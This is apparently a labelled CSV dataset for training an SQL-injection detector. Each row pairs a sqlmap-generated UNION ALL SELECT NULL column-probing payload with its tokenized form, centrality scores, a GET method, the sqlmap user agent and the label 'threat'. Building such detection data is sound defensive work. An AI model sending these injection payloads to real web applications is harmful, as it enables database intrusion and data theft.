payload,token,centrality,requestmethod,uagent,label
"1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kMTt",INT SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.08695652173913043 0.10869565217391304 0.13043478260869565 0.15217391304347827 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.15217391304347827 0.13043478260869565 0.10869565217391304 0.08695652173913043,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- kMTt",INT SQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.08695652173913043 0.10869565217391304 0.13043478260869565 0.15217391304347827 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.17391304347826086 0.15217391304347827 0.13043478260869565 0.10869565217391304 0.08695652173913043,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RjKr",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RjKr",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VxJX",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VxJX",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RdgI",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RdgI",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DUOk",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.10256410256410256 0.1282051282051282 0.15384615384615385 0.1794871794871795 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.1794871794871795 0.15384615384615385 0.1282051282051282 0.10256410256410256,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- DUOk",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.10256410256410256 0.1282051282051282 0.15384615384615385 0.1794871794871795 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.20512820512820512 0.1794871794871795 0.15384615384615385 0.1282051282051282 0.10256410256410256,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- xlhL",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.0975609756097561 0.12195121951219512 0.14634146341463417 0.17073170731707318 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.1951219512195122 0.17073170731707318 0.14634146341463417 0.12195121951219512 0.0975609756097561,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qpDg",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.09302325581395349 0.11627906976744186 0.13953488372093023 0.16279069767441862 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.16279069767441862 0.13953488372093023 0.11627906976744186 0.09302325581395349,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qpDg",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.09302325581395349 0.11627906976744186 0.13953488372093023 0.16279069767441862 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.18604651162790697 0.16279069767441862 0.13953488372093023 0.11627906976744186 0.09302325581395349,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qehb",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.08888888888888889 0.11111111111111112 0.13333333333333333 0.15555555555555556 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.15555555555555556 0.13333333333333333 0.11111111111111112 0.08888888888888889,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Qehb",INT SQUT UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.08888888888888889 0.11111111111111112 0.13333333333333333 0.15555555555555556 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.17777777777777778 0.15555555555555556 0.13333333333333333 0.11111111111111112 0.08888888888888889,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gBcI",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.14285714285714285 0.17857142857142855 0.21428571428571427 0.25 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.25 0.21428571428571427 0.17857142857142855 0.14285714285714285,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- gBcI",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.14285714285714285 0.17857142857142855 0.21428571428571427 0.25 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.2857142857142857 0.25 0.21428571428571427 0.17857142857142855 0.14285714285714285,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IqQs",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.13333333333333333 0.16666666666666666 0.2 0.23333333333333334 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.26666666666666666 0.23333333333333334 0.2 0.16666666666666666 0.13333333333333333,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HLBv",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.125 0.15625 0.1875 0.21875 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.21875 0.1875 0.15625 0.125,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HLBv",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.125 0.15625 0.1875 0.21875 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.25 0.21875 0.1875 0.15625 0.125,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- lQDU",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.11764705882352941 0.14705882352941177 0.1764705882352941 0.20588235294117646 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.23529411764705882 0.20588235294117646 0.1764705882352941 0.14705882352941177 0.11764705882352941,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZiHx",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.1111111111111111 0.1388888888888889 0.16666666666666666 0.19444444444444442 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.19444444444444442 0.16666666666666666 0.1388888888888889 0.1111111111111111,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZiHx",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.1111111111111111 0.1388888888888889 0.16666666666666666 0.19444444444444442 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.2222222222222222 0.19444444444444442 0.16666666666666666 0.1388888888888889 0.1111111111111111,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BIco",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- BIco",INT DQUT RPRN UNION ALL SELECT NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL CMMA NULL DSCMT STR,0.1 0.125 0.15000000000000002 0.17500000000000002 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.2 0.17500000000000002 0.15000000000000002 0.125 0.1,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
